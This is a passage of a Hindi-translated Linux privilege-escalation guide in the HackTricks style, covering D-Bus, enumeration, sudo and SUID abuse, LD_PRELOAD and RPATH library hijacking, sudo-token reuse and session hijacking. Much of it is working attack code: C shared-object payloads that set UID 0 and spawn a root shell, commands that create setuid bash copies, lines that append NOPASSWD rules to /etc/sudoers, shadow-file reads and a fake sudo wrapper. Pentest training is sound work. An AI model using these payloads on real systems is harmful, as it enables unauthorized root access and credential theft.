यह प्रणाली बहुमुखी है, बुनियादी IPC का समर्थन करती है जो प्रक्रियाओं के बीच डेटा के आदान-प्रदान को बढ़ाती है, और यह **enhanced UNIX domain sockets** की याद दिलाती है। इसके अलावा, यह इवेंट्स या सिग्नल्स को ब्रॉडकास्ट करने में मदद करती है, जिससे सिस्टम घटकों के बीच सहज एकीकरण होता है। उदाहरण के लिए, एक Bluetooth daemon से आने वाले कॉल का सिग्नल किसी music player को म्यूट करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो अनुप्रयोगों के बीच service requests और method invocations को सरल बनाता है, और पारंपरिक रूप से जटिल प्रक्रियाओं को सुव्यवस्थित करता है।

D-Bus एक **allow/deny model** पर काम करता है, जो message permissions (method calls, signal emissions, आदि) का प्रबंधन matching policy rules के सम्मिलित प्रभाव के आधार पर करता है। ये policies bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions का दुरुपयोग करके संभावित रूप से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root उपयोगकर्ता के लिए `fi.w1.wpa_supplicant1` को own, send to, और receive messages from करने की permissions का विवरण देता है।

यदि policies में कोई user या group निर्दिष्ट नहीं है तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies द्वारा कवर नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना हमेशा रोचक होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनसे आप उसे पहुँचने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँच करें कि क्या आप ट्रैफ़िक sniff कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य Enumeration

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को escalate privileges की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी **समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ रोचक तो नहीं है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप वातावरण का कोई भी पासवर्ड **जानते हैं** तो पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

अगर आप बहुत शोर करने की परवाह नहीं करते और कंप्यूटर पर `su` और `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी users पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आपको पता चलता है कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख** सकते हैं तो आप अधिकार उन्नयन (privilege escalation) कर सकते हैं — इसके लिए आप writable फ़ोल्डर के अंदर किसी command के नाम से एक backdoor बना सकते हैं जो किसी दूसरे user (आदर्शतः root) द्वारा execute किया जाएगा और वह उस folder से लोड नहीं होता है जो आपके writable फ़ोल्डर से $PATH में पहले स्थित है।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति हो सकती है या उन पर suid bit सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी उपयोगकर्ता को किसी अन्य उपयोगकर्ता की privileges के साथ कोई command बिना password जाने चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में user `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक `ssh key` जोड़कर या `sh` चलाकर shell प्राप्त करना सहज है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **based on HTB machine Admirer**, **vulnerable** था **PYTHONPATH hijacking** के कारण arbitrary python library लोड करने के लिए जब script को root के रूप में execute किया जा रहा था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo निष्पादन बायपास करने वाले पथ

**Jump** करके अन्य फ़ाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path

यदि **sudo permission** एक single command को **path निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है अगर एक **suid** binary **कोई अन्य कमांड बिना उसके path को निर्दिष्ट किए execute करता है (हमेशा _**strings**_ से उस अजीब SUID binary की सामग्री की जाँच करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें कमांड का path निर्दिष्ट हो

यदि **suid** binary **path निर्दिष्ट करते हुए कोई अन्य कमांड execute करता है**, तो आप उस कमांड के नाम से एक **फ़ंक्शन export** करने की कोशिश कर सकते हैं जिसे suid file कॉल कर रहा है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ को कॉल करता है तो आपको उस फ़ंक्शन को बनाकर export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

हालाँकि, सिस्टम की सुरक्षा बनाए रखने और इस सुविधा के शोषण को रोकने के लिए, विशेषकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- लोडर उन executables के लिए **LD_PRELOAD** को अनदेखा करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और जो खुद भी suid/sgid हों, वही libraries preload की जाती हैं।

Privilege escalation तब हो सकता है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल हो। यह configuration **LD_PRELOAD** environment variable को `sudo` के साथ commands चलाते समय भी बरकरार और मान्यता प्राप्त होने देता है, जिससे संभावित रूप से elevated privileges के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc दुरुपयोग किया जा सकता है यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उन path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे binary का सामना हो जिसके पास असामान्य **SUID** permissions हों, तो यह अच्छी प्रैक्टिस है यह जाँचना कि वह **.so** files सही ढंग से load कर रहा है या नहीं। इसे निम्नलिखित command चलाकर जाँच किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर exploitation की संभावना संकेतित होती है।

इसे exploit करने के लिए, एक C फ़ाइल बनाकर आगे बढ़ें, उदाहरण के लिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित code होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed हो जाने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंततः, प्रभावित SUID binary को चलाने पर exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस folder से एक library लोड कर रहा है जहाँ हम लिख सकते हैं, तो आइए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपने जो library जनरेट की है उसमें `a_function_name` नाम का एक function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिसे attacker द्वारा local security restrictions को bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) समान है लेकिन उन मामलों के लिए जहाँ आप एक command में **only inject arguments** कर सकते हैं।

यह project Unix binaries के legitimate functions को इकट्ठा करता है जिन्हें abuse करके restricted shells से break out करना, elevated privileges को escalate या maintain करना, files transfer करना, bind और reverse shells spawn करना, और अन्य post-exploitation tasks को सहूलियत देना संभव होता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि क्या यह किसी sudo rule को exploit करने का तरीका ढूँढता है।

### Sudo Tokens का पुनः उपयोग

ऐसे मामलों में जहाँ आपके पास **sudo access** तो है पर password नहीं है, आप privileges escalate कर सकते हैं **waiting for a sudo command execution and then hijacking the session token**।

Privileges escalate करने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने हाल ही में **`sudo` का उपयोग किया होना चाहिए** किसी चीज़ को execute करने के लिए, यानी **last 15mins** के भीतर (डिफ़ॉल्ट रूप से यही sudo token की अवधि होती है जो हमें `sudo` बिना password डाले उपयोग करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे अपलोड करने में सक्षम हो सकते हैं)

(आप अस्थायी रूप से `ptrace_scope` को सक्षम कर सकते हैं: `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी शर्तें पूरी हैं, तो **आप निम्नलिखित का उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ में binary `activate_sudo_token` बनाएगा। आप इसका उपयोग अपनी session में **sudo token activate करने के लिए** कर सकते हैं (आपको स्वचालित रूप से root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root द्वारा owned और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers फ़ाइल बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के भीतर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।\

उदाहरण के लिए, यदि आप फाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ shell है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त** कर सकेंगे, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas`। इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में जाँचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) उपयोग करता है तो नई path जोड़ने के लिए आपको अन्य files संशोधित करनी होंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से आ रही हैं**। आम तौर पर, यह फ़ाइल निम्न पथ रखती है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरीज़** की **खोज** की जाएगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ की खोज करेगा**।

यदि किसी कारण से **एक उपयोगकर्ता के पास write permissions** हों किसी भी संकेतित पथ पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल, या `/etc/ld.so.conf.d/*.conf` के भीतर कॉन्फ़िग फ़ाइल में दर्शाया गया कोई भी फ़ोल्डर, तो वह escalate privileges कर सकता है.\
नीचे दिए पेज में देखें **how to exploit this misconfiguration**:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, यह प्रोग्राम द्वारा `RPATH` वेरिएबल में निर्दिष्ट उसी स्थान से उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक evil library बनाएं `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities एक प्रोसेस को उपलब्ध root privileges का **एक उपसमूह प्रदान करते हैं**। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में विभाजित कर देता है**। इन इकाइयों में से प्रत्येक को फिर स्वतंत्र रूप से प्रक्रियाओं को प्रदान किया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation का जोखिम घटता है।\
अधिक जानने के लिए निम्नलिखित पेज पढ़ें कि **capabilities क्या हैं और इन्हें कैसे abuse किया जा सकता है**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

डायरेक्टरी में, **bit for "execute"** का अर्थ है कि प्रभावित user फोल्डर में "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि user **list** कर सकता है **files**, और **"write"** bit का मतलब है कि user **delete** और **create** कर सकता है नए **files**।

## ACLs

Access Control Lists (ACLs) डिस्क्रीशनलरी permissions की सेकेंडरी लेयर का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **override** करने में सक्षम है। ये permissions फाइल या डायरेक्टरी एक्सेस पर नियंत्रण बढ़ाते हैं, उन विशिष्ट users को अधिकार देने या न देने की अनुमति देकर जो owner नहीं हैं या समूह का हिस्सा नहीं हैं। इस स्तर की **granularity अधिक सटीक access management सुनिश्चित करती है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

पुराने संस्करणों में आप किसी अलग उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.  
नए संस्करणों में आप केवल अपने ही **your own user** के **screen** sessions से ही **connect** कर पाएँगे। हालांकि, आप session के अंदर **interesting information** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **old tmux versions** के साथ थी। मैं एक tmux (v2.1) session को, जो root द्वारा बनाया गया था, एक non-privileged user के रूप में hijack नहीं कर पाया।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**किसी session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सभी SSL और SSH keys जो Debian based systems (Ubuntu, Kubuntu, etc) पर September 2006 और May 13th, 2008 के बीच जनरेट हुई थीं, इस बग से प्रभावित हो सकती हैं.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 संभावित संयोजन संभव थे**. इसका मतलब यह है कि सभी संभावनाएँ गणना की जा सकती हैं और **यदि आपके पास ssh public key है तो आप संबंधित private key खोज सकते हैं**. आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह निर्दिष्ट करता है कि सर्वर खाली password स्ट्रिंग वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और यदि commands विकल्प निर्दिष्ट हों तभी लॉगिन कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जो user authentication के लिए उपयोग की जा सकती हैं। यह `%h` जैसे tokens रख सकता है, जिन्हें home directory से बदला जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर छोड़ने के बजाय उपयोग कर सकें। इसलिए, आप ssh के माध्यम से **jump** **to a host** कर पाएँगे और वहां से **jump to another** host कर सकेंगे, **using** उस **key** को जो आपके **initial host** में स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script पाया जाए तो आपको इसे **संवेदनशील विवरण** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

